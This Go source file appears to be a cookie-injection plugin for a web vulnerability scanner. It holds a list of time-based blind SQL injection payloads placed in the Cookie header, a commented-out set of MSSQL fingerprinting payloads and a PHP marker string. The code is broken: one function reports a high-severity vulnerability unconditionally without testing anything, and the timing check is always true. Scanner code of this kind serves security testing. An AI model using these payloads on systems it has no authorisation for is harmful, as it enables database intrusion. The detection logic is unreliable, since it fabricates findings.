package cookieinject

import (
	"errors"
	"fmt"
	"glint/config"
	"glint/logger"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	"glint/util"
	"strings"
	"time"
)

var cert string
var mkey string

type CallbackCheck func(args ...interface{}) (bool, error)

var DefaultProxy = ""

var st = `<?php echo"<pre>dsadsacxz<pre>"?>`

type classWebShell struct {
	scheme layers.Scheme
	// InjectionPatterns      classInjectionPatterns
	TargetUrl            string
	inputIndex           int
	reflectionPoint      int
	disableSensorBased   bool
	currentVariation     int
	foundVulnOnVariation bool
	variations           *util.Variations
	lastJob              layers.LastJob
	VulnPayload          string
	lastJobProof         interface{}
	// injectionValidator     TInjectionValidator
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	isUnknown              bool
	trueFeatures           *layers.MFeatures
	// IsSensorServerEnabled  bool
}

func (c *classWebShell) ClearFeature() {
	if c.lastJob.Features != nil {
		c.lastJob.Features.Clear()
	}
	if c.trueFeatures != nil {
		c.trueFeatures.Clear()
	}
}

func CookieValid(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var err error
	var variations *util.Variations

	var WebShell classWebShell
	//var hostid int64
	// var blastIters interface{}
	util.Setup()
	var Param layers.PluginParam
	gd := args
	// layers.Init()
	ct := layers.CheckType{}
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       time.Duration(Param.Timeout) * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	WebShell.lastJob.Init(Param)
	// variations,err = util.ParseUri(url)
	// BlindSQL.variations =

	variations, err = util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers, nil)
	//赋值
	WebShell.variations = variations
	WebShell.lastJob.Layer.Sess = sess
	WebShell.TargetUrl = Param.Url
	WebShell.lastJob.Layer.Method = Param.Method
	WebShell.lastJob.Layer.ContentType = Param.ContentType
	WebShell.lastJob.Layer.Headers = Param.Headers
	WebShell.lastJob.Layer.Body = []byte(Param.Body)
	defer WebShell.ClearFeature()
	// sess := nenet.GetSessionByOptions(
	// 	&nenet.ReqOptions{
	// 		Timeout:       time.Duration(Param.Timeout) * time.Second,
	// 		AllowRedirect: false,
	// 		Proxy:         Param.UpProxy,
	// 		Cert:          Param.Cert,
	// 		PrivateKey:    Param.CertKey,
	// 	})

	detail := fmt.Sprintf("cookie inject vulnerability found. payload:%s", WebShell.VulnPayload)

	Result := util.VulnerableTcpOrUdpResult(Param.Url,
		detail,
		[]string{string(WebShell.lastJob.Features.Request.String())},
		[]string{string(WebShell.lastJob.Features.Response.String())},
		"high",
		Param.Hostid, string(plugin.CmdInject))

	gd.Alert(Result)

	return Result, true, err

	return nil, false, errors.New("Cookie inject vulnerability not found")
}

func (c *classWebShell) CookieEval(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	c.isUnknown = true
	var Param layers.PluginParam
	ct := layers.CheckType{}
	Param.ParsePluginParams(args, ct)
	if config.IsSensorServerEnabled {

		// var cookie_mssql_payload_list = []string{
		// 	"'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",
		// 	"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",
		// 	"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",
		// 	"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",
		// 	"'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --",
		// 	"'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ",
		// 	"'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --",
		// 	"'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --",
		// }

		var cookie_Blind_payload_list = []string{
			"sleep(__TIME__)#",
			"1 or sleep(__TIME__)#",
			"\" or sleep(__TIME__)#",
			"' or sleep(__TIME__)#",
			"\" or sleep(__TIME__)=",
			"' or sleep(__TIME__)='",
			"1) or sleep(__TIME__)#",
			"\") or sleep(__TIME__)=\"",
			"') or sleep(__TIME__)='",
			"1)) or sleep(__TIME__)#",
			"\")) or sleep(__TIME__)=\"",
			"')) or sleep(__TIME__)='",
			";waitfor delay '0:0:__TIME__'--",
			");waitfor delay '0:0:__TIME__'--",
			"';waitfor delay '0:0:__TIME__'--",
			"\";waitfor delay '0:0:__TIME__'--",
			"');waitfor delay '0:0:__TIME__'--",
			"\");waitfor delay '0:0:__TIME__'--",
			"));waitfor delay '0:0:__TIME__'--",
			"'));waitfor delay '0:0:__TIME__'--",
			"\"));waitfor delay '0:0:__TIME__'--",
			"benchmark(10000000,MD5(1))#",
			"1 or benchmark(10000000,MD5(1))#",
			"\" or benchmark(10000000,MD5(1))#",
			"' or benchmark(10000000,MD5(1))#",
			"1) or benchmark(10000000,MD5(1))#",
			"\") or benchmark(10000000,MD5(1))#",
			"') or benchmark(10000000,MD5(1))#",
			"1)) or benchmark(10000000,MD5(1))#",
			"\")) or benchmark(10000000,MD5(1))#",
			"')) or benchmark(10000000,MD5(1))#",
		}

		sess := nenet.GetSessionByOptions(
			&nenet.ReqOptions{
				Timeout:       time.Duration(Param.Timeout) * time.Second,
				RetryTimes:    Param.MaxRedirectTimes,
				AllowRedirect: false,
				Proxy:         Param.UpProxy,
				Cert:          Param.Cert,
				PrivateKey:    Param.CertKey,
			})
		if strings.ToUpper(Param.Method) == "GET" {
			for _, payload := range cookie_Blind_payload_list {
				fn := func() interface{} {
					_, resp, err := sess.Get(Param.Url, Param.Headers)
					if err != nil {
						logger.Error(err.Error())
					}
					return resp
				}
				pass := false
				// 检测时间长度
				// 短 中 长 超长 等待
				newpayload := strings.Replace(payload, "__TIME__", "2", -1)
				Param.Headers["Cookie"] = newpayload
				_, time := util.TimeFunc(fn)
				if time < time+2 {
					pass = true
				}
				if !pass {
					return nil, false, fmt.Errorf("time out")
				}

			}
		} else {
			_, _, err := sess.Post(Param.Url, Param.Headers, []byte(Param.Body))
			if err != nil {
				logger.Error(err.Error())
			}
			return nil, false, fmt.Errorf("time out")
		}

	}

	return nil, false, fmt.Errorf("time out")
}
